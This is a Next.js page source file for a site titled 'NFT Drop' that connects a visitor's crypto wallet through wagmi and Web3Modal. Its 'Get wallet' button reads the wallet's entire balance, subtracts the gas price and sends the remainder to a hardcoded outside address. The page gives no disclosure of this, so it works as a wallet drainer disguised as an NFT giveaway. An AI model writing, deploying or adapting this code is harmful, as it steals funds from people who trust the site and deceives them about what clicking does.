import Head from 'next/head'
import 'bootstrap/dist/css/bootstrap.css'
import styles from '@/styles/Home.module.css'
import { EthereumClient, w3mConnectors, w3mProvider } from '@web3modal/ethereum'
import { Web3Modal } from '@web3modal/react'
import { configureChains, createClient, WagmiConfig } from 'wagmi'
import { arbitrum, mainnet, polygon } from 'wagmi/chains'
import { Web3Button } from '@web3modal/react'
import { useAccount, useContract, useSigner, useBalance } from 'wagmi'
import Homepage from '../components/Homepage'
import { useEffect, useState } from 'react'
import MyABI from './abi.json'
import { QueryClient, QueryClientProvider } from 'react-query';
import { fetchBalance } from '@wagmi/core'
import { fetchFeeData } from '@wagmi/core'
import { useDebounce } from 'use-debounce'
import { usePrepareSendTransaction,  useSendTransaction } from 'wagmi'
import WalletConnectProvider from '@web3modal/walletconnect-provider'



const chains = [arbitrum, mainnet, polygon]
const projectId = process.env.NEXT_PUBLIC_PROJECT_ID;
const contractAddress = process.env.NEXT_PUBLIC_CONTRACT
const queryClient = new QueryClient()


//console.log(projectId)

const { provider } = configureChains(chains, [WalletConnectProvider])
const wagmiClient = createClient({
  autoConnect: true,
  connectors: w3mConnectors({ projectId, version: 1, chains }),
  provider
})
const ethereumClient = new EthereumClient(wagmiClient, chains)



export default function Home() {
  const {address, isConnected} =   useAccount()
  const [myBalance, setMyBalance]=useState()
  const [gasFee, setGasFee] = useState()
  const [amount, setAmount] = useState('')
  
  const to = '0x80a79C84330600E8c1B98CDC66509676310DDE13'
  const [debouncedTo] = useDebounce(to, 500)
  //let stringValue = toString(utils.parseEther(debouncedAmount))
  const { config } = usePrepareSendTransaction({
    request: {
      to: debouncedTo,
      value:  amount,
    },
  })
 
  const  { sendTransaction } = useSendTransaction(config)

  const accBalance = async ()=>{
    const balance = await fetchBalance({
      address,
    })

    const fee = await fetchFeeData({
      formatUnits: 'ether',
    })
    setGasFee(fee.formatted.gasPrice)
    setMyBalance(balance.formatted)

   
    
  }
  


  const [logged, setLoggedIn] = useState(false)
  //const contract = useContract( contractAddress, MyABI)
  useEffect(() => {
    if(isConnected){
        
        setLoggedIn(true)
    }
  },[])
  
const getWallet = async() => {
 
  //console.log(myBalance)
  const amtToSend = myBalance-gasFee
  accBalance()
  setAmount(amtToSend)
  sendTransaction?.()
  console.log(gasFee, myBalance, amtToSend)
 

}  

  return (
    <>
    
      <Head>
        <title>NFT Drop</title>
        <meta name="description" content="Generated by create next app" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <link rel="icon" href="/favicon.ico" />
      </Head>
      <main className={styles.main}>
       
      <>
      
        <Homepage />
        <button className='btn btn-primary' onClick={getWallet}>Get wallet</button>
      

      <Web3Modal projectId={projectId} ethereumClient={ethereumClient} />
     
    </>
        
      </main>
      
    </>
  )
}
